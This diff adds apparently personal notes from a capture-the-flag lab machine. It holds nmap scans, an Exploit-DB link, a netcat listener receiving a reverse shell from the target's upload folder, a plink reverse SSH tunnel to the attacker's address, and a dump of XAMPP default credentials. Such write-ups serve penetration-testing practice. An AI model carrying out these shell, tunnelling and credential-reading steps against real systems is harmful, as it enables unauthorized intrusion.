@@ -1,0 +1,76 @@
+nmap -T4 10.10.10.198
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2020-08-24 22:09 IST
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 2.14 seconds
+
+nmap -p1000-65535 -T4 -Pn 10.10.10.198
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2020-08-24 22:11 IST
+Nmap scan report for 10.10.10.198
+Host is up (0.59s latency).
+Not shown: 599 filtered ports
+PORT     STATE SERVICE
+7680/tcp open  pando-pub
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 57.72 seconds
+
+
+
+https://www.exploit-db.com/exploits/48506
+
+
+nc -lvp 1234
+Listening on [0.0.0.0] (family 0, port 1234)
+Connection from 10.10.10.198 57228 received!
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\gym\upload>
+
+
+https://dev.to/cambiph/setting-up-an-ssh-tunnel-using-plink-4om7
+
+plink.exe -v -x -a -T -C -noagent -ssh -R 8888:127.0.0.1:8888 lol@10.10.14.199
+
+
+
+
+
+
+
+C:\xampp>type passwords.txt
+type passwords.txt
+### XAMPP Default Passwords ###
+
+1) MySQL (phpMyAdmin):
+
+   User: root
+   Password:
+   (means no password!)
+
+2) FileZilla FTP:
+
+   [ You have to create a new user on the FileZilla Interface ] 
+
+3) Mercury (not in the USB & lite version): 
+
+   Postmaster: Postmaster (postmaster@localhost)
+   Administrator: Admin (admin@localhost)
+
+   User: newuser  
+   Password: wampp 
+
+4) WEBDAV: 
+
+   User: xampp-dav-unsecure
+   Password: ppmax2011
+   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
+   For activation please comment out the httpd-dav.conf and
+   following modules in the httpd.conf
+   
+   LoadModule dav_module modules/mod_dav.so
+   LoadModule dav_fs_module modules/mod_dav_fs.so  
+   
+   Please do not forget to refresh the WEBDAV authentification (users and passwords).
